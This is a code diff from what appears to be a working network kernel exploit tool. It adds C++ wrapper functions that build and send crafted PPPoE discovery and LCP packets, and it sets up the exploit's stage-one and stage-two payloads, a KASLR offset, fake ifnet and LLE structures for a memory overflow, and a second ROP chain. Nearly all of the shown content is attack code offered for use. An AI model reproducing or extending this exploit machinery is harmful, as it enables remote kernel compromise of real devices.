@@ -35,35 +35,79 @@ void setPppoeSoftc(uint64_t pppoe_softc) {
     exploit.pppoe_softc = pppoe_softc;
 }
 
+void setKaslrOffset(uint64_t value) {
+    exploit.kaslr_offset = value;
+}
+
+void setStage1(const uint8_t *data, uint64_t size) {
+    exploit.setStage1(std::vector<uint8_t>(data, data + size));
+}
+
+void setStage2(const uint8_t *data, uint64_t size) {
+    exploit.setStage2(std::vector<uint8_t>(data, data + size));
+}
+
 void setTargetIpv6(const char *ipv6) {
     exploit.target_ipv6 = pcpp::IPv6Address(ipv6);
 }
 
-int buildPado(uint8_t *buffer, uint64_t size) {
-    auto cookie = Exploit::build_fake_ifnet(&exploit);
+uint64_t buildFakeIfnet(uint8_t *buffer, uint64_t size) {
+    auto data = Exploit::build_fake_ifnet(&exploit);
+    memcpy(buffer, data.data(), size);
+    return data.size();
+}
+
+uint64_t buildOverflowLle(uint8_t *buffer, uint64_t size) {
+    auto data = Exploit::build_overflow_lle(&exploit);
+    memcpy(buffer, data.data(), size);
+    return data.size();
+}
+
+uint64_t buildFakeLle(uint8_t *buffer, uint64_t size) {
+    auto data = Exploit::build_fake_lle(&exploit);
+    memcpy(buffer, data.data(), size);
+    return data.size();
+}
+
+uint64_t buildSecondRop(uint8_t *buffer, uint64_t size) {
+    auto data = Exploit::build_second_rop(&exploit);
+    memcpy(buffer, data.data(), size);
+    return data.size();
+}
+
+int buildPado(uint8_t *buffer, uint64_t size, uint8_t *cookie, uint64_t cookie_size) {
     pcpp::Packet &&packet = PacketBuilder::pado(exploit.source_mac, exploit.target_mac,
-                                                cookie.data(), cookie.size(),
-                                                (uint8_t *) &exploit.pppoe_softc, sizeof(uint64_t));
+                                                cookie, cookie_size,
+                                                (uint8_t * ) & exploit.pppoe_softc, sizeof(uint64_t));
     return COPY_TO_BUFFER(buffer, packet);
 }
 
-void sendPado() {
-    auto cookie = Exploit::build_fake_ifnet(&exploit);
+void sendPado(uint8_t *cookie, uint64_t cookie_size) {
     pcpp::Packet &&packet = PacketBuilder::pado(exploit.source_mac, exploit.target_mac,
-                                                cookie.data(), cookie.size(),
-                                                (uint8_t *) &exploit.pppoe_softc, sizeof(uint64_t));
+                                                cookie, cookie_size,
+                                                (uint8_t * ) & exploit.pppoe_softc, sizeof(uint64_t));
     exploit.dev->sendPacket(&packet);
 }
 
 int buildPads(uint8_t *buffer, uint64_t size) {
     pcpp::Packet &&packet = PacketBuilder::pads(exploit.source_mac, exploit.target_mac,
-                                                (uint8_t *) &exploit.pppoe_softc, sizeof(uint64_t));
+                                                (uint8_t * ) & exploit.pppoe_softc, sizeof(uint64_t));
     return COPY_TO_BUFFER(buffer, packet);
 }
 
 void sendPads() {
     pcpp::Packet &&packet = PacketBuilder::pads(exploit.source_mac, exploit.target_mac,
-                                                (uint8_t *) &exploit.pppoe_softc, sizeof(uint64_t));
+                                                (uint8_t * ) & exploit.pppoe_softc, sizeof(uint64_t));
+    exploit.dev->sendPacket(&packet);
+}
+
+int buildPadt(uint8_t *buffer, uint64_t size) {
+    pcpp::Packet &&packet = PacketBuilder::padt(exploit.source_mac, exploit.target_mac);
+    return COPY_TO_BUFFER(buffer, packet);
+}
+
+void sendPadt() {
+    pcpp::Packet &&packet = PacketBuilder::padt(exploit.source_mac, exploit.target_mac);
     exploit.dev->sendPacket(&packet);
 }
 
@@ -174,11 +218,21 @@ int buildLcpEchoReply(uint8_t *buffer, uint64_t size, const char *source_mac, co
     return COPY_TO_BUFFER(buffer, packet);
 }
 
-void
-sendLcpEchoReply(const char *source_mac, const char *target_mac, int16_t session, uint8_t id, uint32_t magic_number) {
+void sendLcpEchoReply(const char *source_mac, const char *target_mac,
+                      int16_t session, uint8_t id, uint32_t magic_number) {
     auto source = pcpp::MacAddress(source_mac);
     auto target = pcpp::MacAddress(target_mac);
     pcpp::Packet &&packet = PacketBuilder::lcpEchoReply(source, target, session, id, magic_number);
+    exploit.dev->sendPacket(&packet);
+}
+
+int buildLcpTerminate(uint8_t *buffer, uint64_t size) {
+    pcpp::Packet &&packet = PacketBuilder::lcpTerminate(exploit.source_mac, exploit.target_mac);
+    return COPY_TO_BUFFER(buffer, packet);
+}
+
+void sendLcpTerminate() {
+    pcpp::Packet &&packet = PacketBuilder::lcpTerminate(exploit.source_mac, exploit.target_mac);
     exploit.dev->sendPacket(&packet);
 }
 
